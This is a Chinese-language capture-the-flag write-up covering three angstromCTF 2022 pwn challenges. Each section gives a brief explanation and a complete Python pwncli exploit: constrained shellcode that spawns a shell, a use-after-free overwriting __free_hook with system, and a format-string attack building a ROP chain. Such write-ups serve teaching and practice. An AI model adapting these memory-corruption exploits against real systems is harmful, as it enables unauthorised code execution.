# 2022-angstromCTF-pwn



# 2022-angstromCTF-pwn-wp

记录`wp`。

<!-- more -->

## angstromCTF-parity

### 解题思路

限制了输入的`shellcode`，字节必须依次偶数、奇数、偶数、奇数......

![image-20220430233928340](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220430233928340.png)

最有效的方式是在`shellcode`里面构造`read`，然后输入第二段`shellcode`，这样第一段`shellcode`就只需要很短即可。小技巧是偶数用`\x90`填充，奇数可选用`\xfd`也就是`std`指令填充。

多次尝试后，写出如下`exp`。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from audioop import byteswap
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

"""
4c 87 e2                xchg   rdx,r12
"""

shellcode = """
push 0x040f040f
pop rbx
lea rcx, [rdx]
std
mov [rcx+0x30], bl
std
xchg   rdx,r12
"""

data = asm(shellcode)
data += b"\xfd\x90"*0x10 + b"\x05\x90"*8

for i, c in enumerate(data):
    if i & 1 != c & 1:
        log_ex(list(bytearray(data)))
        errlog_exit("wrong shellcode!")

io.sendafter("> ", data, timeout=10)
sleep(2)

s(b"\x90"*0x50 + ShellcodeMall.amd64.execve_bin_sh)

ia()
```

![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/Y{1@_9Q1J6S`P0@JX@XJ{QH.png)

## angstromCTF-dreams

### 解题思路

常规的`UAF`，首先修改`max_dream`这个变量，然后泄露出`libc`，打`__free_hook`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def add(idx, date="deadbee\n", dream="cafebeef"):
    sla("> ", "1")
    sla("In which page of your mind do you keep this dream? ", str(idx))
    sa("What's the date (mm/dd/yy))? ", date)
    sa("what did you dream about? ", dream)


def delete(idx):
    sla("> ", "2")
    sla("Which one are you trading in? ", str(idx))


def edit(idx, date):
    sla("> ", "3")
    sla("What dream is giving you trouble? ", str(idx))
    ru("Hmm... I see. It looks like your dream is telling you that ")
    m = rl()
    sa("New date: ", date)
    log_ex(f"get msg: {m}")
    return m

add(0)
add(1)

delete(1)
delete(0)

edit(0, p64(0x404000))

add(2)
add(3,dream=b"a"*8+p64_ex(0x0101010101010101))

m = edit(3, "deadbeef")

libc_base = u64_ex(m[-7:-1]) - libc.sym._IO_2_1_stdout_
set_current_libc_base_and_log(libc_base, 0)

add(4)

delete(4)
delete(0)
edit(0, p64(libc.sym.__free_hook))

add(10, "/bin/sh\n")

add(11, p64(libc.sym.system))

delete(10)

ia()
```



![QQ图片20220430234637](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/QQ图片20220430234637.png)

## caniride

### 解题思路

漏洞有两个地方，第一个地方可以泄露程序基地址，第二个可以格式化字符串攻击。

![image-20220503141939353](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220503141939353.png)

注意，第一个使用的占位符是`%s`，也就是说得在程序段上找到一个指针，指向一个程序段或`libc`的地址；如果直接去泄露`got`表，输出的其实是指令......

找到这个地方，一个指向自己的指针：

![image-20220503142344649](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220503142344649.png)

因为泄露后还有第二次输入的机会，所以就可以在第二次输入的时候输入地址。

接下来的思路就是：

- `printf attack`修改`.finit_array`的第一个元素为`main`函数地址；同时，泄露出`libc`的地址
- 第二次执行`main`函数，利用`printf attack`修改`exit@got`为`add rsp; 0x98; ret`这个`gadget`的地址
- 然后执行`rop`即可



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sla("Name: ", "%105c%16$hhndeadbeef%143$p\n")
sla("Pick your driver: ", "-3")
ru("Hi, this is ")
m = ru(" ")
code_base = u64_ex(m[:-1]) - 0x35a8
set_current_code_base_and_log(code_base, 0)
sa("So... tell me a little about yourself: ", p64_ex(code_base + 0x3300))
ru("deadbeef")
m = rl()
libc_base = int16_ex(m[:-2]) - libc.sym.__libc_start_main - 243
set_current_libc_base_and_log(libc_base, 0)

og = CurrentGadgets.find_gadget("add rsp, 0x98; ret;")

h1 = (og & 0xffffff) >> 16
l2 = og & 0xffff

sla("Name: ", f"%{h1}c%16$hhn%{l2-h1}c%17$hn")
sla("Pick your driver: ", "1")

layout = [
    elf.got.exit + 2, # exit@got
    elf.got.exit,
    [CurrentGadgets.ret()]*0x20,
    CurrentGadgets.pop_rdi_ret(),
    CurrentGadgets.bin_sh(),
    libc.sym.system
]
sa("So... tell me a little about yourself: ", flat(layout))

ia()
```

远程：

![image-20220503142959629](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220503142959629.png)



## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-30-angstromctf-pwn/  

